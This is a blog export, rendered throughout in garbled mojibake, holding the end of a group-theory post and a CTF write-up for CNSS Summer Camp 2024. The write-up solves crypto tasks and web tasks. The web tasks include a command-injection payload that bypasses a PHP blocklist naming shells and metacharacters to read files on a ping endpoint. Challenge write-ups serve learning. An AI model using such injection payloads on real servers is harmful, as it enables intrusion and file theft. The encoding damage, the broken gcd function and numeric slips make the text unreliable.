”ç©¶çš„æ•°å­¦å¯¹è±¡æ˜¯æ­£å¤šè¾¹å½¢ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©æ­£å…­è¾¹å½¢ã€‚ç¾¤ä¸­çš„å…ƒç´ æ˜¯ä½¿å…­è¾¹å½¢ä¿æŒåŸä½çš„å˜æ¢ç©ºé—´çš„ä¸åŒæ–¹æ³•ï¼Œå³â€œæ—‹è½¬â€å’Œâ€œç¿»è½¬åæ—‹è½¬â€ã€‚ æ­¤æ—¶ $|\\mathbb{D}_6|=12$ï¼Œå…¶ä¸­æœ‰ 0ã€60ã€20ã€180ã€240ã€300Â° ä»¥åŠç¿»è½¬åå¯¹åº”çš„ 6 ç§æ—‹è½¬ã€‚æ‰€ä»¥ $|\\mathbb{D}_n|=2n$ã€‚ ç»™é¡¶ç‚¹æ¶‚æ¶‚é¢œè‰²å†çœ‹çœ‹ï¼Ÿåœ¨å…­è¾¹å½¢é‡Œå†™ä¸‹å­—æ¯Dï¼Ÿ æˆ‘ä»¬å‘ç°ï¼ŒDihedral Group ä¸å…·å¤‡äº¤æ¢æ€§ï¼Œå› ä¸ºç¿»è½¬å’Œæ—‹è½¬çš„é¡ºåºå†³å®šäº†å…­è¾¹å½¢çš„æ‰‹æ€§ã€‚ SubGroupå­ç¾¤æ˜¯ç¾¤çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸”å…¶æœ¬èº«æ°å¥½æ˜¯ç¾¤ã€‚ ä¾‹å¦‚ï¼šå¶æ•°é›†æ˜¯æ•´æ•°é›†çš„å­ç¾¤ï¼Œ$\\mathbb{D}_6$ä¸­çš„æ—‹è½¬æœ¬èº«ä¹Ÿæ„æˆä¸€ä¸ªå­ç¾¤ï¼Œ$\\mathbb{D}_3$ä¹Ÿæ˜¯$\\mathbb{D}_6$çš„ä¸€ä¸ªå­ç¾¤ï¼Œè€Œ$\\mathbb{Z}_9$ä¸­æœ‰0ã€3ã€6è¿™ä¸ªå­ç¾¤ã€‚ ç”¨å…ƒç´ $a$ç”Ÿæˆä¸€ä¸ªå­ç¾¤&lt;$a$&gt;ï¼š$a,a^2,a^3,â€¦$ã€‚è¿™åªå¯¹æœ‰é™ç¾¤æœ‰æ•ˆã€‚æ¯”å¦‚å°†å¶æ•°ç¾¤è¡¨ç¤ºä¸º2çš„ç”Ÿæˆå­ç¾¤æ—¶ï¼Œæˆ‘ä»¬å¯¹è´Ÿå¶æ•°æ— èƒ½ä¸ºåŠ›ï¼Œä¸ºäº†ä½¿å…¶æˆä¸ºå­ç¾¤ï¼Œéœ€è¦é¢å¤–æ·»åŠ å•ä½å…ƒå’Œé€†å…ƒã€‚ åœ¨ä¸€ä¸ªæ— é™ç¾¤ä¸­æ‰¾åˆ°ä¸€ä¸ªå…ƒç´ ï¼Œå®ƒçš„ç”Ÿæˆå­ç¾¤ä¸éœ€è¦å•ä½å…ƒæˆ–é€†å…ƒã€‚ Cosetæ•´æ•°ç¾¤ä¸­ï¼Œå¥‡æ•°é›†åˆå¯ä»¥ç”±å¶æ•°ç¾¤æ•´ä½“å¹³ç§»1å¾—åˆ°ï¼Œæˆ‘ä»¬ç§°è¿™æ ·çš„é›†åˆä¸ºé™ªé›†ã€‚ä¸€ä¸ªç¾¤ç¡®å®ç®—ä½œè‡ªèº«çš„é™ªé›†ã€‚ å›å¿†ä¸€ä¸‹$\\mathbb{D}_6$ï¼Œ6ä¸ªæ—‹è½¬æ–¹æ³•æ„æˆä¸€ä¸ªå­ç¾¤ï¼Œé‚£ä¹ˆæ—‹è½¬åç¿»è½¬ï¼Œä¹Ÿå°±æ˜¯&lt;æ—‹è½¬&gt;å¹³ç§»ä¸€ä¸ªâ€œç¿»è½¬â€çš„è·ç¦»å°±æ„æˆäº†ä¸€ä¸ªé™ªé›†ã€‚ä¹Ÿå¯ä»¥æŠŠ&lt;æ—‹è½¬&gt;å¹³ç§»ä¸€ä¸ªæ—‹è½¬çš„è·ç¦»ï¼Œå°½ç®¡è¿™æ ·åšä¼šæŠŠæ—‹è½¬å­ç¾¤å†…çš„å…ƒç´ æ‰“ä¹±ã€‚ è®©æˆ‘ä»¬ç»§ç»­è¿™ä¸ªæ¸¸æˆï¼&lt;ç¿»è½¬&gt;æ‰€ç”Ÿæˆçš„å­ç¾¤åªæœ‰ä¸¤ä¸ªå…ƒç´ ï¼Œç¿»è½¬ä¸€æ¬¡å’Œç¿»è½¬ä¸¤æ¬¡ï¼Œæ˜¾ç„¶ç¿»è½¬ä¸¤æ¬¡æ˜¯ä¸­æ€§å…ƒï¼ˆä»€ä¹ˆä¹Ÿæ²¡åšï¼‰ã€‚æŠŠç¿»è½¬å­ç¾¤å¹³ç§»60åº¦ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ª60åº¦çš„æ—‹è½¬å’Œä¸€ä¸ª300åº¦æ—‹è½¬åç¿»è½¬ã€‚ ç¾¤å’Œå®ƒçš„å­ç¾¤æ˜¯é«˜åº¦å¯¹ç§°çš„ã€‚ Lagrangeâ€™s Theoremå‡è®¾ç°åœ¨æœ‰ä¸ªç¾¤ï¼Œç¾¤é‡Œå­˜åœ¨ä¸€ä¸ªå°çš„å­ç¾¤ã€‚å­ç¾¤æ‰€è¡ç”Ÿå‡ºçš„é™ªé›†å¯ä»¥æ•´é½åœ°å°†æ•´ä¸ªç¾¤åˆ’åˆ†ä¸ºå¤§å°ä¸€æ ·çš„å—ã€‚ è¿™é‡Œæœ‰ä¸¤ç‚¹æ˜¯ å®¹æ˜“ç†è§£ çš„ï¼š é™ªé›†ä¸€å®šè¦†ç›–äº†æ•´ä¸ªç¾¤ï¼šå› ä¸ºæ— è®ºä½ æƒ³å¾—åˆ°å“ªä¸ªå…ƒç´ ï¼Œåªéœ€å¹³ç§»å¯¹åº”çš„å·®å€¼å³å¯ã€‚ æ‰€æœ‰çš„é™ªé›†å¤§å°ç›¸åŒï¼šå¹³ç§»æ—¶æ˜¾ç„¶ä¸ä¼šå¢åŠ å…ƒç´ ï¼Œé‚£ä¼šä¸ä¼šå‡å°‘å‘¢ï¼Ÿå‡è®¾å‡å°‘ï¼Œæˆ‘ä»¬ä¸€å®šå¯ä»¥ç”¨é€†å…ƒæŠŠå®ƒä»¬å¹³ç§»å›å»ï¼Œè¿™æ ·å°±ä¼šå‡­ç©ºå¢åŠ å…ƒç´ ã€‚ ä¸‹é¢æœ‰ä¸€ç‚¹æ˜¯ä¸é‚£ä¹ˆæ˜¾ç„¶çš„ï¼šæ‰€æœ‰çš„é™ªé›†ä¸ä¼šç›¸äº’é‡åˆã€‚ å‡å¦‚ä½ å¹³ç§»äº†ä¸€ä¸ªå­ç¾¤ä¸­çš„å…ƒç´ ï¼Œç”±äºå°é—­æ€§ï¼Œå¾—åˆ°çš„å…ƒç´ ä¸€å®šåœ¨å­ç¾¤é‡Œã€‚é‚£å‡å¦‚ä½ å¹³ç§»äº†ä¸€ä¸ªä¸åœ¨å­ç¾¤ä¸­çš„å…ƒç´ ï¼Œç»“æœä¼šä¸ä¼šå‡ºç°åœ¨å­ç¾¤é‡Œå‘¢ï¼Ÿ ä¾‹å¦‚å­ç¾¤ä¸­æœ‰$aã€b$ä¸¤ä¸ªå…ƒç´ ï¼Œè€Œ$z$ä¸åœ¨å­ç¾¤ä¸­ï¼Œä¸”$z\\circ a=b$ï¼Œåˆ™$z=b\\circ a^{-1}$ï¼Œå› ä¸º$b$å’Œ$a^{-1}$å‡åœ¨å­ç¾¤é‡Œï¼Œæ‰€ä»¥$z$ä¹Ÿåœ¨å­ç¾¤ä¸­ï¼Œè¿™ä¸å‡è®¾çŸ›ç›¾ï¼ï¼ æ‰€ä»¥æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªäºŒåˆ†è®ºæ–­ï¼šä¸€ä¸ªé™ªé›†è¦ä¹ˆä¸åŸæ¥çš„å­ç¾¤å®Œå…¨ä¸é‡åˆï¼Œè¦ä¹ˆå®ƒå°±æ˜¯å­ç¾¤ï¼ åŒç†å¯è¯æ­¤äºŒåˆ†è®ºæ–­ä¸ä»…åœ¨å­ç¾¤å’Œé™ªé›†é—´ï¼Œåœ¨é™ªé›†å’Œé™ªé›†é—´åŒæ ·æˆç«‹ã€‚ æ‹‰æ ¼æœ—æ—¥å®šç† å¯¹äºç¾¤$G$å’Œå®ƒçš„å­ç¾¤$H$ï¼Œ$H$çš„é˜¶å¯ä»¥æ•´é™¤$G$çš„é˜¶ã€‚ å¯¹äºä¸€ä¸ªç´ æ•°$p$é˜¶ç¾¤ï¼Œå®ƒçš„å­ç¾¤åªèƒ½æ‹¥æœ‰1ä¸ªæˆ–pä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆå®ƒä¸€å®šæ˜¯å¾ªç¯ç¾¤ï¼ï¼ï¼ o.0 å¯æ˜¯æ‹‰æ ¼æœ—æ—¥ï¼ˆ1736â€”1813ï¼‰åœ¨ç¾¤è®ºè¯ç”Ÿå‰å°±â€¦","link":"/2025/02/28/Baby-Group/"},{"title":"CNSS Summer-Camp 2024","text":"Letâ€™s Capture The Flag! CNSSåœ¨2024å¹´8æœˆçš„CTFå¤ä»¤è¥â›±ï¸é¢˜ç›®ï¼Œè‡ªå·±çš„wpã€‚ ğŸ”¢CryptoğŸ”®cnsså¨˜çš„è°œè¯­cnsså¨˜ä¿¡æ‰‹å†™ä¸‹å‡ ä¸²æ„ä¹‰ä¸æ˜çš„è°œè¯­ï¼Œä½ å¯ä»¥çŒœå‡ºå…¶ä¸­çš„å«ä¹‰å—ï¼Ÿ 1234567891011121314151617181920212223242526import base64from Crypto.Util.number import *from secret import flag ## secret is a local file, flag is unknown to you. Try to find it.assert type(flag) == strflag = flag.encode()length = len(flag)assert length % 4 == 0L = length // 4secret1 = bytes_to_long(flag[:L])secret2 = flag[L:2*L].hex()secret3 = bin(int(flag[2*L:3*L].hex(), 16))secret4 = base64.b64encode(flag[3:L])print(f&quot;{secret1 = }&quot;)print(f&quot;{secret2 = }&quot;)print(f&quot;{secret3 = }&quot;)print(f&quot;{secret4 = }&quot;)&quot;&quot;&quot;secret1 = 30772543014919602267414633191secret2 = 'bc96e7a081e698afe5ada620'secret3 = '0b10000110111001001111001011100000111010001101111001000001110011110011010100001001110011110101100'secret4 = b'rOS4gOatpeOAgiF9'&quot;&quot;&quot; å¸¸è§ç¼–ç ï¼ŒæŠŠåè¿›åˆ¶ã€åå…­è¿›åˆ¶ã€äºŒè¿›åˆ¶å’Œ base64 åˆ†åˆ«è½¬åŒ–ä¸ºå­—èŠ‚ï¼Œæ‹¼èµ·æ¥å utf-8 è½¬æˆ string å°±èƒ½è¿˜åŸå‡ºflagã€‚ cnss{å­¦ä¼šç¼–ç æ˜¯å­¦ Crypto çš„ç¬¬ä¸€æ­¥ã€‚!} ğŸ¬æ°´é¾™åŸæ¥šå¤©åƒé‡Œæ¸…ç§‹ï¼Œæ°´éšå¤©å»ç§‹æ— é™…ã€‚é¥å²‘è¿œç›®ï¼ŒçŒ®æ„ä¾›æ¨ï¼Œç‰ç°ªèºé«»ã€‚ 12345678910111213141516from Crypto.Util.number import *from secret import flagm = bytes_to_long(flag)p = 4873905926740615531018463661385452170898784133203367799135441645830937750628221985822405430005703937197770247575076559744236744538228018031486049820173674g = 2593552830271406523114019117101950399687742243315195843514987700785182656087120211241524521448500935829478648514527037446437576680778419567396094750508622c = 0for i in range(m): c = (c + g) % pprint(f'{c = }')&quot;&quot;&quot;c = 3431276814099066030808269572939347769420622699894452016972504433264414095698239241816562301198442206498226641308404105790355301176892588988847042699636406&quot;&quot;&quot; è§£ä¸€ä¸ªçº¿æ€§åŒä½™æ–¹ç¨‹ï¼š$$c \\equiv mg\\pmod{p}$$ ç”¨é€†å…ƒæ±‚è§£ï¼š é¦–å…ˆç”¨ Euclid ç®—æ³•é€’å½’è®¡ç®— $g$ å’Œ $p$ çš„æœ€å¤§å…¬çº¦æ•° $gcd(g, p)$ï¼š 12345def gcd(a, b): if b == 0: return a return gcd(a, a % b)# gcd(g, p) = 23027835966762406 æ–¹ç¨‹ä¸¤è¾¹åŒæ—¶é™¤ä»¥ $gcd$ï¼Œåªéœ€æ‰¾åˆ° $gâ€™$ çš„é€†å…ƒå³å¯ã€‚$$m\\equiv câ€™gâ€™\\pmod{pâ€™}$$ ç”¨ Extend Euclid alg æ±‚è§£ï¼šå‘ä¸‹é€’ï¼Œå‘ä¸Šå½’ã€‚ 12345def exgcd(a, b): if b == 0: return a, 1, 0 d, x, y = exgcd(b, a % b) return d, y, x - (a // b) * y è§£å‡º $m$ å°±èƒ½è¿˜åŸå‡º flagã€‚ cnss{Subgroup @nd Eucl1d algOrithm 1s eleg4nt.} ğŸŒ”åœç®—å­æƒŠèµ·å´å›å¤´ï¼Œæœ‰æ¨æ— äººçœã€‚æ‹£å°½å¯’æä¸è‚¯æ –ï¼Œå¯‚å¯æ²™æ´²å†·ã€‚ 12345678910111213141516171819from Crypto.Util.number import flagfrom secret import flagp, q, r = getPrime(512), getPrime(512), getPrime(512)n = p * q * re = 65537m = bytes_to_long(flag)c = pow(m, e, n)print('p =', p)print('q =', q)print('n =', n)print('c =', c)&quot;&quot;&quot;p = 12253096079262730693787845304459770181159272160708761390419517461435886798119494973936186382645490774511179747402693066192362104144553287739427091488849987q = 9656184899794050073098614505490788837141112476549205418072011388278372195682566976277132351856116300104728124405389485440262266612903835574949734938773879n = 1068394811940475700113916170772008310607904879176073274337669322446687936907143981238893756179197975634434673229920275765973807209412891205884402965483756254507691419368528133959132303476165747992107800736918701005971552264644185146124560027884795936191839406241406301141310602020436434278421529178345240902508007101551941438277539664839258109542374751444222500079818129540895166090788487787028178055561786822480872065405947357363186718845196587434430898650662917c = 364812620179131273680130240148084836403846027393384913159162092631491386521136431985815726041640268869899250546875572473450702105133851945618590296616284218872409897353796638895758963083075264218372930102765065661636950920355098372841435042642748593167374414989630427181232399218196685772309403529745406119979371226428026631723070867224675860939203796555567951762311063010081727524747799375832842589314306700599116049075415601108806973017635507910763925927172362&quot;&quot;&quot; æ¬§æ‹‰å®šç† è‹¥ $n$ï¼Œ$a$ ä¸ºæ­£æ•´æ•°ä¸” $gcd(a, n)=1$ï¼Œåˆ™$a^{\\phi(n)}\\equiv1\\pmod{n}$ã€‚ ç”±äº $c\\equiv m^e\\pmod{n}$ï¼Œè®¾ $d$ ä¸º $e$ æ¨¡ $\\phi(n)$ çš„é€†å…ƒï¼Œå³$$ed\\equiv 1\\pmod{\\phi(n)}$$åˆ™æœ‰$$c^d\\equiv m^{ed}\\equiv m^{1+k\\phi(p)}\\equiv m\\pmod{n}$$å› æ­¤ï¼Œåˆ©ç”¨ä¸‰ç´ æ•° RSA å³å¯è§£å‡º flagã€‚ cnss{1t is similar to two-prime RSA....} ğŸ Fun_factoringHave fun in the factoring! 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import randomfrom Crypto.Util.number import *from gmpy2 import next_primefrom secret import flag1, flag2def init(): primes = [] p = 1 while len(primes) &lt; 100: p = next_prime(p) primes.append(int(p)) return primesprimes = init()p1 = getPrime(256)while True: q1 = 1 while q1.bit_length() &lt; 255: q1 *= random.choice(primes) q1 = q1 + 1 if isPrime(q1): breakn1 = p1 * q1e = 65537m1 = bytes_to_long(flag1)c1 = pow(m1, e, n1)print(f'{n1 = }')print(f'{c1 = }')m2 = bytes_to_long(flag2)p2 = getPrime(256)q2 = getPrime(256)n2 = p2 * q2c2 = pow(m2, e, n2)phi = (p2 - 1) * (q2 - 1)e2 = getPrime(256)d2 = inverse(e2, phi)hint1 = getPrime(256) * n2hint2 = e2 * d2print(f'{c2 = }')print(f'{hint1 = }')print(f'{hint2 = }')&quot;&quot;&quot;n1 = 29993156790273796411588637755401407649619741972315831791586727944419911570896819043688187483218756247767784823799572993962152654560761989054087817767687901c1 = 28308885699728621592812918494757273712938007912315485487807230648420711341284570451708049371754826651903406663574768899937862287581243099737368091309807825c2 = 3677242432073556679040222440039877927024312077564452145956625214187804614184186227277646425370459616386984491952553180136037741092781602470053045143802537hint1 = 397340046977096077577115578026599912881304442662450049334426974861677656259439266980515145452369301652618056238525786266286451780972189318240092026572582216328286841448920434798083168400087303822060653407466964485682775061825982767hint2 = 42319976894927564843833810567252442522907372281560684051129782019144211533194692653447095916384084531450449319697685128778953472384491084162072476640254892049041007337641419872550411941455264025858397584349456909103991157799852081&quot;&quot;&quot; é¦–å…ˆinit()å‡½æ•°ç”Ÿæˆäº†å‰100ä¸ªç´ æ•°ï¼Œ$q_1-1$ å…‰æ»‘ï¼Œè€ƒè™‘ä½¿ç”¨ Pollardâ€™s p - 1 algorithmã€‚ æ ¹æ® Fermatâ€™s little theoremï¼šè‹¥ $p$ æ˜¯ $N$ çš„ç´ å› å­ï¼Œä¸” $a$ ä¸ $p$ äº’ç´ ï¼Œåˆ™$$a^{p-1}\\equiv 1\\pmod{p}$$ $$a^{t(p-1)}-1^t=kp$$ Pollard's p-1 algorithm è‹¥ $p$ æ˜¯ä¸€ä¸ª B-smooth numberï¼Œåˆ™å­˜åœ¨ $$M = \\prod_{q\\leq B} q^{\\lfloor \\log_q B \\rfloor}$$ ä½¿å¾— $(p-1)|M.$ è®¡ç®— $gcd(a^M-1,N)$ã€‚å¦‚æœç»“æœä¸ä¸º $1$ æˆ– $N$ï¼Œé‚£ä¹ˆå°±æˆåŠŸåˆ†è§£äº† $N$ã€‚ ä¸æ˜¯å¾ˆæ‡‚è¿™ä¸ªç»“æ„â€¦ å…¶å®ä¸éš¾å‘ç° $ B!\\ |\\ p-1$ã€‚æ‰€ä»¥åªéœ€æ‰¾åˆ°ä¸€ä¸ªåˆé€‚å¤§å°çš„æ•° $B$ï¼Œå°±å¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´å†…å‡ºç»“æœï¼Œæ‹¿åˆ° flag1ã€‚ 12345678910#expa = 2B = 2while True: a = pow(a, B, N) res = gcd(a - 1, N) if res != 1 and res != N: q = N // res break B += 1 cnss{1f_y0u_Kn0w_Pollard_y0u_Kn0w_1t_4ll} æ³¨æ„åˆ° hint2 å®é™…ä¸Šæ˜¯ $e$ å’Œ $d$ çš„ä¹˜ç§¯ï¼Œè®¡ç®— $k=ed-1$ ä¸º $p-1$ çš„å€æ•°ã€‚é€‰éšæœºæ•° $g\\in(1,N)$ã€‚ RSA: how to factorize N given d $k$ ä¸ºå¶æ•°ï¼Œæ•… $k=2^t\\cdot r$ï¼Œå…¶ä¸­ $r$ ä¸ºå¥‡æ•°ä¸” $t\\geq 1$ï¼Œç„¶åè®¡ç®— $x=g^{\\frac{k}{2}},g^{\\frac{k}{4}},â€¦,g^{\\frac{k}{2^t}}\\pmod{N}$ ç›´åˆ° $x&gt;1$ ä¸” $y=gcd(x-1,N)&gt;1$ã€‚å¦‚æœ $y$ å­˜åœ¨ï¼Œåˆ™ $p=y$ï¼›è‹¥ä¸å­˜åœ¨ï¼Œåˆ™é‡æ–°ç”Ÿæˆ $g$. 12345678910111213#expk = e * d - 1while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x &gt; 1 and gcd(x - 1, n) &gt; 1: p = gcd(x - 1, n) return (p, n // p) å…ˆé€šè¿‡ hint1 æŠŠ n2 åˆ†è§£å‡ºæ¥ï¼Œå†åˆ†è§£å‡º p2 å’Œ q2 æ‹¿åˆ° flag2ã€‚ cnss{Factoring_the_modulus_1s_FUn_fuN_Fun_f0r_The_whOLe_F4miLY!} è¿™ä¸¤ç§æ–¹æ³•çš„æ ¸å¿ƒå°±æ˜¯è´¹é©¬å°å®šç†ã€‚ ğŸ•¸ï¸Webåšå¯†ç é¢˜çš„æ—¶å€™é‡åˆ°å¾ˆå¤šå’Œwebäº¤äº’çš„æƒ…å†µï¼Œé‚å‰æ¥å­¦ä¹ ã€‚ä¸ä¼šWebï¼Œæ‰“ç€ç©çš„ã€‚ ğŸ¦´babyHTTPpsych ä¸Šè¯¾å¼€å°å·®ï¼Œä¸‹è¯¾ä¹‹ååŒæ¡Œè¯´ä»Šå¤©å­¦çš„ HTTP è¯·æ±‚ï¼Œç„¶è€Œ psych å¹¶ä¸çŸ¥é“è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œè¯·ä½ å¸®ä»–å®Œæˆä½œä¸šï¼Œè·å¾— flag ã€‚ HTTP è¯·æ±‚æœ‰ä»€ä¹ˆå†…å®¹å‘¢ï¼Ÿ ä¸€å¼ å›¾è¯´æ˜è®¿é—®ç½‘ç«™çš„æµç¨‹ ç¡¬æ ¸ï¼30 å¼ å›¾è§£ HTTP å¸¸è§çš„é¢è¯•é¢˜ cURLæ˜¯ä¸€ç§é€šè¿‡å‘½ä»¤è¡Œæˆ–è„šæœ¬è¿›è¡Œæ•°æ®ä¼ è¾“çš„å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼Œå¯ä»¥ç”¨æ¥å‘é€httpè¯·æ±‚ï¼Œè·å–æœåŠ¡å™¨å“åº”ã€‚ï¼ˆè¿˜æœ‰å…¶ä»–åŠŸèƒ½ï¼‰ -i(--include)é€‰é¡¹åœ¨è¾“å‡ºä¸­åŒ…å«æœåŠ¡å™¨è¿”å›çš„HTTPå“åº”å¤´ä¿¡æ¯ã€‚-v(--verbose)é€‰é¡¹æ˜¾ç¤ºè¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯å’Œè°ƒè¯•ä¿¡æ¯ã€‚ 123456$ curl &quot;http://152.136.11.155:10101/&quot;Please GET me a CNSS with a value of 'hackers'.$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot;And I need you POST a web with a value of 'fun'.$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot; -X POST -d &quot;web=fun&quot; Do you know cookie?You are not admin! å…³äºcookieæˆ‘ä»¬-içœ‹ä¸€ä¸‹ï¼Œæ‰¾åˆ°Set-Cookie: admin=falseï¼Œæ”¹æˆtrueå°±è¡Œäº†ã€‚ 12$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot; -X POST -d &quot;web=fun&quot; -b &quot;admin=true&quot;CNSS{w2b_!s_Reai1y_7un!!!} å¾¡æ—çš„é¢˜è¿˜è€ƒäº†Refererï¼Œæç¤ºæˆ‘ä»¬You must come from â€œYulinSec://127.0.0.1â€ 1$ curl curl &quot;http://101.35.209.40:44505/?key1=YulinSec&quot; -X POST -d &quot;key2=YulinSec&quot; -H &quot;Referer:YulinSec://127.0.0.1&quot; å…³äº302è·³è½¬é‡å®šå‘çš„é¢˜ï¼Œçœ‹æºç æç¤ºæˆ‘ä»¬flagä½äº/302.phpä¸‹ï¼Œç›´æ¥curlå³å¯æŸ¥åˆ°flagã€‚HTTP OPTIONS Method ğŸ™‹ğŸ¼â€â™€ï¸PHPinfoCNSSå¨˜ï¼phpinfoæ–‡ä»¶æ˜¯ä»€ä¹ˆå‘€ï¼ å¦‚ä½•åˆ›å»ºphpinfoæ–‡ä»¶å¹¶æŸ¥çœ‹PHPä¿¡æ¯ â€“ WordPresså¤§å­¦ (wpdaxue.com) ç›´æ¥åœ¨URLåæ·»åŠ /phpinfo.phpæŸ¥æ‰¾å³å¯ã€‚ 1cnss{l3t_u5_l3arn_php!nfo!} ğŸ¥‡æˆ‘å¾—å†å¿«ç‚¹è€ƒéªŒæ‰‹é€Ÿçš„æ—¶å€™åˆ°äº† scRsCrIptiPt çœ‹äº†ç½‘é¡µçš„æºä»£ç ï¼Œä½¿ç”¨javascriptå®ç°ä¸€ä¸ªè‡ªåŠ¨åˆ·æ–°çš„é¡µé¢ï¼ŒGETä¼ å‚åˆ°/checkå°±è¡Œäº†ã€‚ 12345&lt;p&gt;Key : 6Dd3LzGVhvEn8wv&lt;span id=&quot;variable&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;form action=&quot;/check&quot; method=&quot;GET&quot;&gt; &lt;input type=&quot;text&quot; id=&quot;value&quot; name=&quot;value&quot; required&gt; &lt;button type=&quot;Flag&quot;&gt;Flag&lt;/button&gt; &lt;/form&gt; æœºå™¨çš„ç¡®æ˜¯æ¯”äººå¿«å‘€ï¼å†™ä¸€ä¸ªpythonè„šæœ¬ï¼ŒRequestsåº“ä¸ç½‘ç«™è¿›è¡Œäº¤äº’ã€‚ 12345678910111213141516171819202122232425262728293031import requestsimport hashliburl = 'http://152.136.11.155:10103'submit_url = 'http://152.136.11.155:10103/check'def get_md5_hash(): try: content = requests.get(url).text key = content.split('Key : ')[1].split('&lt;span id=&quot;variable&quot;&gt;')[0].strip() return hashlib.md5(key.encode()).hexdigest() except requests.RequestException as e: print(f&quot;Error: {e}&quot;) return Nonedef submit_md5(md5_hash): try: return requests.get(submit_url, params={'value': md5_hash}).text except requests.RequestException as e: print(f&quot;Error: {e}&quot;) return Noneif __name__ == &quot;__main__&quot;: md5_hash = get_md5_hash() if md5_hash: result = submit_md5(md5_hash) if result: print(result)&quot;&quot;&quot;cnss{3njoy_py5crIpt_n0w!!}&quot;&quot;&quot; ğŸ“Pingpsychï¼š#pingCNSSå¨˜ï¼špong! è¿ä¸Šä¹‹ååªæœ‰ä¸€æ®µPHPä»£ç ï¼š 12345if (isset($_POST['ip'])) { $ip = $_POST['ip']; $ping_result = ping($ip); echo nl2br($ping_result); } å¾ˆæ˜æ˜¾è¿™æ˜¯è®©æˆ‘ä»¬ç”¨POSTæ–¹æ³•ä¼ ä¸€ä¸‹ipåœ°å€ï¼Œç„¶åæœåŠ¡å™¨æ‰§è¡Œpingå‡½æ•°ã€‚è¯•ä¸€ä¸‹ï¼š 12345678$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1&quot;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.&lt;br /&gt;64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.046 ms&lt;br /&gt;64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms&lt;br /&gt;&lt;br /&gt;--- 127.0.0.1 ping statistics ---&lt;br /&gt;2 packets transmitted, 2 received, 0% packet loss, time 31ms&lt;br /&gt;rtt min/avg/max/mdev = 0.039/0.042/0.046/0.007 ms å‘ç°æœ‰å›æ˜¾ï¼Œä½†è¿‡äºæ­£å¸¸ã€‚é€šè¿‡æœç´¢ctf web pingå¾—çŸ¥ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤è¿æ¥ç¬¦å°è¯•åˆ—ç›®å½•ã€‚äºæ˜¯ 1234$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1;ls&quot;Error: Invalid input.$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1;&quot;Error: Invalid input. ä¸å¹¸åˆå¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬çŸ¥é“åˆ†å·;è¢«æ»¤æ‰äº†ã€‚å¼€æœï¼ 12$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1%0als&quot;index.php å‡ºç°äº†ï¼Œemmmï¼Œä¸æ˜¯æƒ³è¦çš„ã€‚åˆ«æ€¥ï¼Œçœ‹çœ‹æ€ä¹ˆä¸ªäº‹å„¿ï¼šå“ï¼Œç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚ 1$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1%0acat%09index.php&quot; 12345678910111213141516171819202122232425262728293031323334353637function validate_input($input) {$invalid_chars = array(&quot;sh&quot;,&quot;bash&quot;,&quot;chown&quot;,&quot; &quot;, &quot;chmod&quot;, &quot;echo&quot;, &quot;+&quot;, &quot;&amp;&quot;,&quot;;&quot;, &quot;|&quot;, &quot;&gt;&quot;, &quot;&lt;&quot;, &quot;`&quot;, &quot;\\\\&quot;, &quot;\\&quot;&quot;, &quot;'&quot;, &quot;(&quot;, &quot;)&quot;, &quot;{&quot;, &quot;}&quot;, &quot;[&quot;, &quot;]&quot;);foreach ($invalid_chars as $invalid_char) {if (strpos($input, $invalid_char) !== false) {return false;}}if (preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $input)) {return false;}return true;}function ping($ip_address) {if (!validate_input($ip_address)) {return &quot;Error: Invalid input.&quot;;}$cmd = &quot;ping -c 2 &quot; .$ip_address;exec($cmd, $output, $return_code);if ($return_code !== 0) {echo(&quot;Error: Failed to execute command.&quot;);}return implode(&quot;\\n&quot;, $output);}if (isset($_POST['ip'])) {$ip = $_POST['ip'];$ping_result = ping($ip);echo nl2br($ping_result); // è¾“å‡ºpingç»“æœå¹¶ä¿ç•™æ¢è¡Œ}?&gt; æ€»ç®—çœ‹åˆ°è¿‡æ»¤å±‚äº†ã€‚å»å…¶TAç›®å½•çœ‹çœ‹å§ã€‚ å“ˆï¼Ÿå“ˆï¼Here it isï¼æ¥æ¥è®©æˆ‘ä»¬catä¸€ä¸‹ï¼š 12curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=1.1.1.1%0acat%09../../../f*&quot;CNSS{p0ng_pong_p0ng!!!} åœ¨è¿™ä¹‹å‰æˆ‘ä¸€ç›´å°è¯•ç½‘ä¸Šæœåˆ°çš„å„ç§ç»•è¿‡flagé™åˆ¶çš„æ–¹æ³•ï¼Œç›´åˆ° fanâœŒï¸ä¸€å¥è¯ç‚¹é†’äº†æˆ‘ å­¦åˆ°äº†ï¼Œè°¢è°¢å®å®ï¼ˆå•¾å’ªï¼‰&gt; ğŸ¶CNSSå¨˜ã®å® ç‰©å•†åº—CNSSå¨˜å¼€å§‹åˆ›ä¸šå•¦ï¼CNSSå¨˜ã®å® ç‰©å•†åº—æ­£å¼å¼€ä¸šï¼ 